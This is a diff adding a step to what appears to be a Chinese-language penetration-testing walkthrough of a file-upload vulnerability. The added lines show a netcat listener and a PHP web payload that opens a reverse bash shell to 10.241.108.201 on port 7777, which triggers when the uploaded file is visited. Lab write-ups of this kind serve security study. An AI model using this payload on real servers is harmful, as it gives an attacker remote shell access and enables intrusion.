@@ -70,3 +70,16 @@ Content-Type: text/plain
 果然得到路径
 ![](file-20260428172223661.png)
 漏洞存在，接下来可以反弹shell了。
+
+```bash
+┌──(kali㉿kali)-[~/桌面]
+└─$ nc -lvp 7777       
+listening on [any] 7777 ...
+
+替换payload为：
+<?php exec('bash -c "bash -i >& /dev/tcp/10.241.108.201/7777 0>&1" &'); ?>
+
+
+```
+
+上传后访问得到的url就可以看到shell反弹了
